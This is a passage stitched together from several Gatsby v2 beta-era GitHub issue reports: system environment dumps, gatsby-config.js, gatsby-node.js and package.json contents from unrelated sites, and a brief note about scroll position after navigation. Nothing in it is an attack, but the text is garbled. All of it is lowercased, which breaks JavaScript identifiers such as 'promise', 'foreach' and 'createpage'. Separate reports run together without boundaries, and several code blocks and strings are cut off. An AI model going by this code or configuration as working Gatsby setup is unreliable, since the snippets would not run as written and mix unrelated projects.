exports.replacerenderer = ( { bodycomponent, replacebodyhtmlstring, setheadcomponents }, { theme = {} }
) => { const sheets = new sheetsregistry() const bodyhtml = rendertostring( <jssprovider registry={sheets}> <themeprovider theme={theme}>{bodycomponent}</themeprovider> </jssprovider> ) replacebodyhtmlstring(bodyhtml) setheadcomponents([ <style type="text/css" id="server-side-jss" key="server-side-jss" dangerouslysetinnerhtml={{ __html: sheets.tostring() }} />, ])
``` now the variable is file scoped and seems to persist across renderings:
import react from "react"
import { jssprovider, sheetsregistry, themeprovider } from "react-jss" const sheets = new sheetsregistry() // eslint-disable-next-line react/prop-types,react/display-name
exports.wraprootelement = ({ element }, { theme = {} }) => ( <jssprovider registry={sheets}> <themeprovider theme={theme}>{element}</themeprovider> </jssprovider>
) exports.onrenderbody = ({ setheadcomponents }) => { setheadcomponents([ <style type="text/css" id="server-side-jss" key="server-side-jss" dangerouslysetinnerhtml={{ __html: sheets.tostring() }} />, ])
(if relevant) system: os: windows 10 cpu: x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 5.6.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 41.16299.611.0 npmpackages: gatsby: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-image: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-link: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-canonical-urls: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-google-analytics: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-google-tagmanager: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-i18n: 0.4.2 => 0.4.2 gatsby-plugin-manifest: 2.0.2-rc.0 => 2.0.2-rc.0 gatsby-plugin-offline: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-purify-css: 2.2.1 => 2.2.1 gatsby-plugin-react-helmet: 3.0.0-rc.0 => 3.0.0-rc.0 gatsby-plugin-remove-trailing-slashes: ^1.0.9 => 1.0.9 gatsby-plugin-robots-txt: 1.3.0 => 1.3.0 gatsby-plugin-sharp: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-sitemap: 2.0.0-rc.0 => 2.0.0-rc.0 gatsby-source-contentful: 2.0.1-rc.0 => 2.0.1-rc.0 gatsby-transformer-remark: 2.1.1-rc.0 => 2.1.1-rc.0 gatsby-transformer-sharp: 2.1.1-rc.0 => 2.1.1-rc.0
system: os: linux 4.15 pop!_os 18.04 lts cpu: x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 4.4.19 - /bin/bash binaries: node: 10.9.0 - ~/.nvm/versions/node/v10.9.0/bin/node npm: 6.2.0 - ~/.nvm/versions/node/v10.9.0/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.1 npmpackages: gatsby: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-emotion: next => 2.0.0-rc.0 gatsby-plugin-facebook-analytics: ^1.0.3 => 1.0.3 gatsby-plugin-google-analytics: ^1.0.31 => 1.0.31 gatsby-plugin-netlify: next => 2.0.0-rc.0 gatsby-plugin-postcss: next => 2.0.0-rc.0 gatsby-plugin-react-helmet: next => 3.0.0-rc.0 gatsby-plugin-robots-txt: ^1.3.0 => 1.3.0 gatsby-plugin-sass: next => 2.0.0-rc.0 gatsby-plugin-stripe-elements: ^1.0.7 => 1.0.7 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-config.js`: `module.exports = { sitemetadata: { siteurl: ` {localeurlsubdomain}.fitplanapp.com`, title: \'best fitness workout and personal trainer app | fitplan\', keywords: [ \'workout apps\', \'fitness apps\', \'best workout apps\', \'exercise apps\', \'best fitness apps\', \'personal trainer app\', \'fitness app\', ], description: "let\'s shed fat, build muscle, and work on your gym confidence with the fitplan app
just pick your plan and personal trainer and workout at home - start today!", }, plugins: [ \'gatsby-source-fitplan\', { resolve: \'gatsby-source-sanity\', options: { token: process.env.sanity_token, projectid: process.env.sanity_project_id, usecdn: false, // [\'production\', \'stage\'].includes(process.env.active_env) }, }, { resolve: \'gatsby-source-stripe\', options: { url: `${config.stripe.base}${config.stripe.plans}`, }, }, { resolve: `gatsby-plugin-google-analytics`, options: { trackingid: process.env.google_analytics_id, head: true, anonymize: false, respectdnt: true, exclude: [\'/404\'], }, }, { resolve: `gatsby-plugin-facebook-analytics`, options: { appid: process.env.facebook_app_id, includeindevelopment: true, debug: false, language: \'en_us\', }, }, { resolve: \'gatsby-plugin-emotion\', options: activeenv === \'production\' ? { hoist: true, } : { sourcemap: true, autolabel: true, }, }, { resolve: \'gatsby-plugin-robots-txt\', options: { resolveenv: () => process.env.gatsby_env, env: { development: { policy: [{ useragent: \'*\', disallow: [\'/\'] }], }, stage: { policy: [{ useragent: \'*\', disallow: [\'/\'] }], }, production: { policy: [{ useragent: \'*\', allow: \'/\' }], }, }, }, }, \'gatsby-plugin-react-helmet\', \'gatsby-plugin-sass\', `gatsby-plugin-stripe-elements`, \'gatsby-plugin-netlify\', // make sure this is last in the array ],
};` `package.json`: `{ "name": "website", "description": "website", "version": "1.0.0", "author": "travis stanley <travis@fitplanapp.com>", "dependencies": { "@babel/core": "^7.0.0-beta.54", "@fortawesome/fontawesome": "^1.1.8", "@fortawesome/fontawesome-free-brands": "^5.0.13", "@fortawesome/fontawesome-free-regular": "^5.0.13", "@fortawesome/fontawesome-free-solid": "^5.0.13", "@fortawesome/react-fontawesome": "0.0.20", "@reach/router": "^1.1.1", "autoprefixer": "^9.1.3", "axios": "^0.18.0", "date-fns": "^2.0.0-alpha.11", "emotion": "^9.2.3", "emotion-server": "^9.2.3", "gatsby": "^2.0.0-rc.0", "gatsby-plugin-emotion": "next", "gatsby-plugin-facebook-analytics": "^1.0.3", "gatsby-plugin-google-analytics": "^1.0.31", "gatsby-plugin-netlify": "next", "gatsby-plugin-postcss": "next", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-robots-txt": "^1.3.0", "gatsby-plugin-sass": "next", "gatsby-plugin-stripe-elements": "^1.0.7", "graphql": "^0.13.2", "node-sass": "^4.9.2", "nuka-carousel": "^4.2.2", "prop-types": "^15.6.1", "react": "^16.4.2", "react-dom": "^16.4.2", "react-emotion": "^9.2.3", "react-facebook-login": "^4.0.1", "react-helmet": "^5.2.0", "react-motion": "^0.5.2", "react-responsive": "^5.0.0", "react-router-dom": "^4.3.1", "react-select": "^2.0.0-beta.7", "react-spring": "^5.3.11", "react-stripe-elements": "^2.0.1", "webpack": "^4.12.0" }, "keywords": [ "gatsby" ], "license": "mit", "scripts": { "build": "gatsby build", "develop": "gatsby develop", "format": "prettier --write \'src/**/*.js\'", "preinstall": "node .preinstall.js", "test": "echo \\"error: no test specified\\" && exit 1" }, "devdependencies": { "eslint": "^4.19.1", "eslint-config-airbnb": "^16.1.0", "eslint-config-prettier": "^2.9.0", "eslint-config-react-tools": "^1.2.5", "eslint-plugin-import": "^2.11.0", "eslint-plugin-jsx-a11y": "^6.0.3", "eslint-plugin-react": "^7.8.2", "prettier": "^1.12.0" }
}` `gatsby-node.js`: `exports.oncreatepage = async ({ page, actions }) => { const { createpage } = actions; // page.matchpath is a special key that's used for matching pages // only on the client
if (page.path.match(/^\\/reset-password/)) { page.matchpath = `/reset-password/*`; // update the page
createpage(page); }
};` `gatsby-browser.js`: `
require('./src/global/index.scss');
require('@fortawesome/fontawesome/styles.css'); const react = require('react'); const globalprovider = require('./src/components/context').default; exports.oncliententry = () => {};
// const provider = props => <react.fragment>{props.children}</react.fragment>; exports.wraprootelement = ({ element }) => ( <globalprovider>{element}</globalprovider>
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.4 - /usr/local/bin/node yarn: 1.9.4 - /usr/local/bin/yarn npm: 6.4.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-rc.0 gatsby-image: next => 2.0.0-rc.0 gatsby-plugin-catch-links: next => 2.0.2-rc.0 gatsby-plugin-eslint: ^2.0.1 => 2.0.1 gatsby-plugin-feed: next => 2.0.0-rc.0 gatsby-plugin-google-analytics: next => 2.0.0-rc.0 gatsby-plugin-google-fonts: ^0.0.4 => 0.0.4 gatsby-plugin-netlify: next => 2.0.0-rc.0 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-netlify-cms: next => 3.0.0-rc.0 gatsby-plugin-nprogress: next => 2.0.0-rc.0 gatsby-plugin-offline: next => 2.0.0-rc.0 gatsby-plugin-react-helmet: next => 3.0.0-rc.0 gatsby-plugin-remove-trailing-slashes: next => 2.0.0-rc.0 gatsby-plugin-sharp: next => 2.0.0-rc.0 gatsby-plugin-sitemap: next => 2.0.0-rc.0 gatsby-plugin-slug: ^1.0.1 => 1.0.1 gatsby-plugin-styled-components: next => 3.0.0-rc.0 gatsby-plugin-svgr: ^2.0.0-alpha => 2.0.0-alpha gatsby-remark-attr: ^0.0.1 => 0.0.1 gatsby-remark-autolink-headers: next => 2.0.0-rc.0 gatsby-remark-copy-linked-files: next => 2.0.0-rc.0 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-images-grid: ^1.0.2 => 1.0.2 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-picture: ^1.0.1 => 1.0.1 gatsby-remark-responsive-iframe: next => 2.0.0-rc.0 gatsby-remark-source-name: ^1.0.0 => 1.0.0 gatsby-remark-unwrap-images: ^1.0.1 => 1.0.1 gatsby-source-filesystem: next => 2.0.1-rc.0 gatsby-transformer-remark: next => 2.1.1-rc.0 gatsby-transformer-sharp: next => 2.1.1-rc.0 npmglobalpackages: gatsby-cli: 1.1.58
``` system: os: windows 10 cpu: x64 intel(r) xeon(r) cpu e3-1230 v3 @ 3.30ghz binaries: yarn: 1.9.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.2.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-image: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-catch-links: ^2.0.2-rc.0 => 2.0.2-rc.0 gatsby-plugin-emotion: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-layout: ^1.0.0-rc.0 => 1.0.0-rc.0 gatsby-plugin-lodash: ^3.0.1-rc.0 => 3.0.1-rc.0 gatsby-plugin-manifest: ^2.0.2-rc.0 => 2.0.2-rc.0 gatsby-plugin-netlify: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-offline: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-react-helmet: ^3.0.0-rc.0 => 3.0.0-rc.0 gatsby-plugin-sharp: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-sitemap: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-plugin-typography: ^2.2.0-rc.0 => 2.2.0-rc.0 gatsby-remark-autolink-headers: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-remark-design-system: ^1.0.16 => 1.0.16 gatsby-remark-external-links: ^0.0.4 => 0.0.4 gatsby-remark-prismjs: ^3.0.0-rc.0 => 3.0.0-rc.0 gatsby-remark-responsive-iframe: ^2.0.0-rc.0 => 2.0.0-rc.0 gatsby-source-filesystem: ^2.0.1-rc.0 => 2.0.1-rc.0 gatsby-transformer-remark: ^2.1.1-rc.0 => 2.1.1-rc.0 gatsby-transformer-sharp: ^2.1.1-rc.0 => 2.1.1-rc.0
``` ### file contents (if changed) `gatsby-config.js`: ```
const settings = require(\'./config/settings\'); const pathprefix = settings.pathprefix === \'/\' ? \'\' : settings.pathprefix; module.exports = { sitemetadata: { siteurl: settings.siteurl + pathprefix, }, plugins: [ \'gatsby-plugin-react-helmet\', { resolve: \'gatsby-plugin-layout\', options: { component: require.resolve(`./src/layouts/index.jsx`), }, }, { resolve: \'gatsby-plugin-emotion\', options: { autolabel: process.env.node_env !== \'production\', labelformat: \'[filename]--[local]\', }, }, { resolve: \'gatsby-source-filesystem\', options: { path: `${__dirname}/docs`, name: \'docs\', }, }, { resolve: \'gatsby-source-filesystem\', options: { path: `${__dirname}/src/images/`, name: \'images\', }, }, { resolve: \'gatsby-transformer-remark\', options: { plugins: [ // plugins must be placed in this order to work correctly! { resolve: \'gatsby-remark-external-links\', options: { target: \'_blank\', rel: \'nofollow noopener noreferrer\', }, }, \'gatsby-remark-design-system\', { resolve: \'gatsby-remark-snippet\', options: { directory: `${__dirname}/src/_examples/`, }, }, \'gatsby-remark-prismjs\', { resolve: `gatsby-remark-autolink-headers`, options: { icon: `<svg xmlns=" " viewbox="0 0 291 122.5" width="33.25" height="14"> <path data-name="link" d="m246.5 0h-46a44.63 44.63 0 0 0 156 44.5v1h-21v-1a44.63 44.63 0 0 0 90.5 0h-46a44.63 44.63 0 0 0 0 44.5v78a44.64 44.64 0 0 0 44.5 44.5h46a44.64 44.64 0 0 0 135 78v-3.5h21v78a44.64 44.64 0 0 0 44.5 44.5h46a44.64 44.64 0 0 0 291 78v44.5a44.63 44.63 0 0 0 246.5 0zm106.67 77.83a13.71 13.71 0 0 1 93 91.5h44a13.71 13.71 0 0 1-13.67-13.67v-35a13.71 13.71 0 0 1 44 29.17h49a13.71 13.71 0 0 1 13.67 13.66v2.67h94a12 12 0 0 0-12 12v5a12 12 0 0 0 12 12h12.67zm154.83 0a13.71 13.71 0 0 1-13.67 13.67h-49a13.71 13.71 0 0 1-13.66-13.67v74.5h197a12 12 0 0 0 12-12v-5a12 12 0 0 0-12-12h-11.83v-2.67a13.7 13.7 0 0 1 13.66-13.66h49a13.71 13.71 0 0 1 13.67 13.66z"/>
</svg>`, }, }, 'gatsby-remark-responsive-iframe', ], }, }, 'gatsby-transformer-sharp', 'gatsby-plugin-sharp', { resolve: 'gatsby-plugin-typography', options: { pathtoconfigmodule: 'src/utilities/typography.jsx', }, }, 'gatsby-plugin-catch-links', 'gatsby-plugin-sitemap', { resolve: 'gatsby-plugin-manifest', options: { name: settings.sitetitle, short_name: settings.siteshortname, description: settings.sitedescription, start_url: settings.pathprefix, background_color: settings.backgroundcolor, theme_color: settings.themecolor, display: 'fullscreen', icons: [ { src: '/favicons/android-chrome-192x192.png', sizes: '192x192', type: 'image/png', }, { src: '/favicons/android-chrome-512x512.png', sizes: '512x512', type: 'image/png', }, ], }, }, // must be placed at the end of the file in this order! 'gatsby-plugin-offline', 'gatsby-plugin-netlify', 'gatsby-plugin-netlify-cache', ],
``` `gatsby-node.js`: ```
const path = require('path');
const { createfilepath } = require('gatsby-source-filesystem');
const { totitlecase, getlastupdatedtimestamp } = require('./src/utilities'); const getslugparents = slug => { const slugparentstring = slug.substring(1, slug.length - 1); return slugparentstring.split('/');
}; exports.oncreatenode = ({ node, getnode, actions }) => { const { createnodefield } = actions; if (node.internal.type === 'markdownremark') { const slug = createfilepath({ node, getnode, basepath: 'pages' }); const slugparentsarr = getslugparents(slug); createnodefield({ node, name: 'slug', value: slug, }); createnodefield({ node, name: 'topleveldir', value: totitlecase(slugparentsarr[0]), }); createnodefield({ node, name: 'subdir', value: totitlecase(slugparentsarr.length > 2 ? slugparentsarr[1] : ''), }); }
}; exports.createpages = ({ graphql, actions }) => { const { createpage } = actions; return new promise((resolve, reject) => { const docpage = path.resolve('src/templates/doc.jsx'); resolve( graphql(` { docs: allmarkdownremark { edges { node { fileabsolutepath fields { slug topleveldir subdir } frontmatter { title } } } } } `).then(result => { if (result.errors) { console.log(result.errors); reject(result.errors); } const docslist = result.data.docs.edges; docslist.foreach(project => { createpage({ path: project.node.fields.slug, component: docpage, context: { slug: project.node.fields.slug, topleveldir: project.node.fields.topleveldir, subdir: project.node.fields.subdir, lastupdated: getlastupdatedtimestamp(project.node.fileabsolutepath), }, }); }); }) ); });
}; exports.oncreatewebpackconfig = ({ stage, actions }) => { actions.setwebpackconfig({ node: { fs: 'empty', child_process: 'empty' }, resolve: { modules: [path.resolve(__dirname, 'src'), 'node_modules'], }, });
``` system: os: windows 10 cpu: x64 intel(r) core(tm) i5-7500 cpu @ 3.40ghz binaries: yarn: 1.9.4 npm: 6.3.0d browsers: chrome: 68.0.3440.106
``` ### file contents (if changed) `gatsby-config.js`: [gatsby-config.js](
`package.json`: [package.json](
`gatsby-node.js`: [gatsby-node.js](
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: os x el capitan 10.11.6 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node npm: 6.2.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 68.0.3440.106 safari: 9.1.2 npmpackages: gatsby: next => 2.0.0-rc.0 gatsby-plugin-react-helmet: next => 3.0.0-rc.0 npmglobalpackages: gatsby: 2.0.0-rc.0
i got some weird errors whilst doing gastby info --clipboard but here's what i did get
system: os: windows 10 cpu: x64 intel(r) core(tm) i5-7600k cpu @ 3.80ghz binaries: npm: 6.4.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: next => 2.0.0-rc.0 gatsby-plugin-manifest: next => 2.0.2-rc.0 gatsby-plugin-offline: next => 2.0.0-rc.0 gatsby-plugin-react-helmet: next => 3.0.0-rc.0
``` system: os: macos sierra 10.12.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.2 - /bin/zsh binaries: node: 8.11.3 - ~/.nvm/versions/node/v8.11.3/bin/node yarn: 1.7.0 - /usr/local/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.3/bin/npm browsers: chrome: 68.0.3440.106 firefox: 59.0.2 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.105 gatsby-paginate: ^1.0.16 => 1.0.16 gatsby-plugin-feed: next => 2.0.0-beta.4 gatsby-plugin-google-analytics: next => 2.0.0-beta.5 gatsby-plugin-offline: next => 2.0.0-beta.9 gatsby-plugin-page-creator: ^1.0.1 => 1.0.1 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-remove-trailing-slashes: next => 2.0.0-beta.3 gatsby-plugin-sass: next => 2.0.0-beta.10 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-remark-copy-linked-files: next => 2.0.0-beta.3 gatsby-remark-images: next => 2.0.1-beta.10 gatsby-remark-prismjs: next => 3.0.0-beta.7 gatsby-remark-responsive-iframe: next => 2.0.0-beta.3 gatsby-remark-smartypants: next => 2.0.0-beta.3 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: next => 2.1.1-beta.6 gatsby-transformer-sharp: next => 2.1.1-beta.7 npmglobalpackages: gatsby-cli: 1.1.58
### file contents (if changed) `gatsby-config.js`:
`package.json`:
`gatsby-node.js`:
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.1 - ~/.nvm/versions/node/v8.11.1/bin/node yarn: 1.9.4 - ~/.nvm/versions/node/v8.11.1/bin/yarn npm: 5.6.0 - ~/.nvm/versions/node/v8.11.1/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.1 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.111 gatsby-plugin-manifest: next => 2.0.2-beta.6 gatsby-plugin-offline: next => 2.0.0-beta.9 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 npmglobalpackages: gatsby-cli: 1.1.58
``` ### other notes - this behaviour doesn't occur on the v1 starter
- i understand that there was a switch to `reach-router`, could this be linked?
- manually adding `window.scrollto(0, 0) / window.scroll({top: 0})` in page `componentdidmount` had no effect, though it would work after wrapping it in an arbitrary `settimeout` - though this yields an initial flash of content in the wrong scroll position
by default, i imagine the desired behaviour would be for all clicked `<link>` elements to scroll you to the top of that target page and that only using the browser back / forward buttons would retain scroll position state in this manner.
``` system: os: macos high sierra 10.13.4 cpu: x64 intel(r) core(tm) i5-4258u cpu @ 2.40ghz shell: 5.3 - /bin/zsh binaries: node: 8.11.4 - /usr/local/bin/node npm: 5.6.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 27.0 safari: 11.1 npmpackages: gatsby: next => 2.0.0-beta.110 gatsby-plugin-manifest: next => 2.0.2-beta.6 gatsby-plugin-offline: next => 2.0.0-beta.9 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sass: next => 2.0.0-beta.10 gatsby-plugin-typography: ^1.7.19 => 1.7.19 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents (if changed) `gatsby-config.js`: ```
module.exports = { sitemetadata: { title: 'diy truck cabin', }, plugins: [ 'gatsby-plugin-react-helmet', { resolve: `gatsby-plugin-manifest`, options: { name: 'gatsby-starter-default', short_name: 'starter', start_url: '/', icon: 'src/images/gatsby-icon.png', // this path is relative to the root of the site
}, }, 'gatsby-plugin-offline', 'gatsby-plugin-sass', { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography`, } } ],
``` `package.json`: n/a
`gatsby-node.js`: n/a
`gatsby-browser.js`: n/a
`gatsby-ssr.js`: n/a
``` system: os: macos high sierra 10.13.5 cpu: x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 5.3 - /bin/zsh binaries: node: 10.5.0 - /usr/local/bin/node yarn: 1.2.1 - /usr/local/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.2 safari: 11.1.1 npmpackages: gatsby: ^2.0.0-beta.106 => 2.0.0-beta.106 npmglobalpackages: gatsby-cli: 1.1.58
``` ### file contents ```
{ "name": "page-renderer-bug", "version": "1.0.0", "main": "index.js", "license": "mit", "dependencies": { "gatsby": "^2.0.0-beta.106", "react": "^16.4.2", "react-dom": "^16.4.2" }
import react, { component } from 'react' export default class work extends component { render() { return ( <div> <h1>work</h1> </div> ) }
import react, { component } from 'react'
import { pagerenderer } from \'gatsby\'; export default class index extends component { render() { return( <div> <h1>hello</h1> <pagerenderer location={{ pathname: "/work" }} /> </div> ); }
system: os: macos high sierra 10.13.6 cpu: x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 10.7.0 - /usr/local/bin/node yarn: yarn install v0.24.6
[1/4] resolving packages...
success already up-to-date.
done in 1.86s
- ~/.node/bin/yarn npm: 6.1.0 - /usr/local/bin/npm browsers: chrome: 68.0.3440.106 firefox: 61.0.1 safari: 11.1.2 npmpackages: gatsby: next => 2.0.0-beta.106 gatsby-image: next => 2.0.0-beta.8 gatsby-link: next => 2.0.0-beta.22 gatsby-plugin-mailchimp: ^2.2.3 => 2.2.3 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-sharp: next => 2.0.0-beta.8 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-source-prismic: ^1.0.2 => 1.0.2 gatsby-transformer-remark: next => 2.1.1-beta.6 gatsby-transformer-sharp: next => 2.1.1-beta.7 npmglobalpackages: gatsby-cli: 1.1.58 ### file contents (if changed) `gatsby-node.js`: ```
const path = require(`path`) exports.createpages = ({ actions, graphql }) => { const { createpage } = actions return new promise((resolve, reject) => { graphql( ` { allprismiccase(limit: 1000) { edges { node { uid data { title { text } client { text } hero { localfile { childimagesharp { fluid(maxwidth: 2800) { base64 tracedsvg aspectratio src srcset srcwebp srcsetwebp sizes } } } } } } } } } `, ).then(result => { if (result.errors) { console.log(result.errors) reject(result.errors) } const casetemplate = path.resolve('./src/templates/case.js') const cases = result.data.allprismiccase.edges cases.map((edge, index) => { const prev = index === cases.length - 1 ? null : cases[index + 1].node const next = index === 0 ? null : cases[index - 1].node return createpage({ path: `/cases/${edge.node.uid}/`, component: casetemplate, context: { slug: edge.node.uid, prev, next, }, }) }) }) graphql( ` { allprismicblogpost(limit: 1000) { edges { node { uid } } } } `, ).then(result => { if (result.errors) { console.log(result.errors) reject(result.errors) } const blogtemplate = path.resolve('./src/templates/blog.js') const blogs = result.data.allprismicblogpost.edges blogs.map(edge => createpage({ path: `/blogs/${edge.node.uid}/`, component: blogtemplate, context: { slug: edge.node.uid, }, }), ) }) resolve() })
``` system: os: windows 10 cpu: x64 intel(r) core(tm) i5-3210m cpu @ 2.50ghz binaries: yarn: 1.7.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.1.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 42.17134.1.0 npmpackages: gatsby: ^2.0.0-beta.100 => 2.0.0-beta.100 gatsby-image: next => 2.0.0-beta.7 gatsby-plugin-catch-links: ^2.0.2-beta.8 => 2.0.2-beta.8 gatsby-plugin-extract-schema: 0.0.4 => 0.0.4 gatsby-plugin-google-analytics: ^2.0.0-beta.5 => 2.0.0-beta.5 gatsby-plugin-manifest: ^2.0.2-beta.5 => 2.0.2-beta.5 gatsby-plugin-netlify: ^2.0.0-beta.6 => 2.0.0-beta.6 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-offline: ^2.0.0-beta.9 => 2.0.0-beta.9 gatsby-plugin-react-helmet: next => 3.0.0-beta.4 gatsby-plugin-remove-trailing-slashes: ^1.0.9 => 1.0.9 gatsby-plugin-sharp: next => 2.0.0-beta.7 gatsby-plugin-sitemap: ^2.0.0-beta.4 => 2.0.0-beta.4 gatsby-plugin-styled-components: next => 3.0.0-beta.3 gatsby-plugin-typography: next => 2.2.0-beta.3 gatsby-remark-autolink-headers: ^2.0.0-beta.5 => 2.0.0-beta.5 gatsby-remark-copy-linked-files: next => 2.0.0-beta.3 gatsby-remark-images: ^2.0.1-beta.10 => 2.0.1-beta.10 gatsby-remark-prismjs: next => 3.0.0-beta.5 gatsby-source-filesystem: next => 2.0.1-beta.10 gatsby-transformer-remark: ^2.1.1-beta.6 => 2.1.1-beta.6 gatsby-transformer-sharp: ^2.1.1-beta.7 => 2.1.1-beta.7
``` ### file contents (if changed) `gatsby-config.js`: ```
module.exports = { sitemetadata: { title: 'nicky blogs', siteurl: ' }, plugins: [ 'gatsby-plugin-react-helmet', { resolve: `gatsby-source-filesystem`, options: { name: `pages`, path: `${__dirname}/src/pages/`, }, }, `gatsby-transformer-sharp`, `gatsby-plugin-sharp`, { resolve: `gatsby-transformer-remark`, options: { plugins: [ { resolve: `gatsby-remark-images`, options: { maxwidth: 590, linkimagestooriginal: false, }, }, { resolve: `gatsby-remark-prismjs`, options: { classprefix: 'language-', inlinecodemarker: null, aliases: {}, }, }, 'gatsby-remark-copy-linked-files', `gatsby-remark-autolink-headers`, ], }, }, `gatsby-plugin-catch-links`, `gatsby-plugin-styled-components`, { resolve: `gatsby-plugin-typography`, options: { pathtoconfigmodule: `src/utils/typography.js`, omitgooglefont: true, }, }, { resolve: `gatsby-plugin-manifest`, options: { name: 'nicky meuleman', short_name: 'nickym', start_url: '/', background_color: '#f5f5f5', theme_color: '#155799', display: 'minimal-ui', icon: 'static/favicon.svg', }, }, 'gatsby-plugin-offline', { resolve: `gatsby-plugin-sitemap`, }, { resolve: `gatsby-plugin-google-analytics`, options: { trackingid: 'ua-117805994-1', head: false, anonymize: true, respectdnt: true, }, }, `gatsby-plugin-remove-trailing-slashes`, 'gatsby-plugin-netlify-cache', 'gatsby-plugin-extract-schema', 'gatsby-plugin-netlify', // keep as last in array ],
`package.json`: ```
{ "name": "nicky-blog", "description": "nicky tries to blog", "version": "0.2.0", "author": "nicky meuleman", "repository": { "type": "git", "url": " " }, "bugs": { "url": " " }, "keywords": [ "blog", "gatsby", "web development" ], "homepage": " ", "dependencies": { "babel-plugin-styled-components": "^1.5.1", "gatsby": "^2.0.0-beta.100", "gatsby-image": "next", "gatsby-plugin-catch-links": "^2.0.2-beta.8", "gatsby-plugin-extract-schema": "0.0.4", "gatsby-plugin-google-analytics": "^2.0.0-beta.5", "gatsby-plugin-manifest": "^2.0.2-beta.5", "gatsby-plugin-netlify": "^2.0.0-beta.6", "gatsby-plugin-netlify-cache": "^0.1.0", "gatsby-plugin-offline": "^2.0.0-beta.9", "gatsby-plugin-react-helmet": "next", "gatsby-plugin-sharp": "next", "gatsby-plugin-sitemap": "^2.0.0-beta.4", "gatsby-plugin-styled-components": "next", "gatsby-plugin-typography": "next", "gatsby-remark-autolink-headers": "^2.0.0-beta.5", "gatsby-remark-copy-linked-files": "next", "gatsby-remark-images": "^2.0.1-beta.10", "gatsby-remark-prismjs": "next", "gatsby-source-filesystem": "next", "gatsby-transformer-remark": "^2.1.1-beta.6", "gatsby-transformer-sharp": "^2.1.1-beta.7", "prismjs": "^1.15.0", "react": "^16.4.2", "react-dom": "^16.4.2", "react-helmet": "^5.2.0", "react-typography": "^0.16.13", "styled-components": "^3.4.2", "typed.js": "^2.0.9", "typeface-roboto": "0.0.54", "typeface-roboto-slab": "0.0.54", "typography": "^0.16.17", "typography-breakpoint-constants": "^0.15.10", "typography-theme-ocean-beach": "^0.15.11" }, "license": "gpl-3.0-or-later", "scripts": { "build": "gatsby build", "serve": "gatsby serve", "dev": "gatsby develop", "format": "prettier --write \'src/**/*.js\'", "test": "echo \\"error: no test specified\\" && exit 1", "commit": "commit" }, "husky": { "hooks": { "pre-commit": "lint-staged", "commit-msg": "commitlint 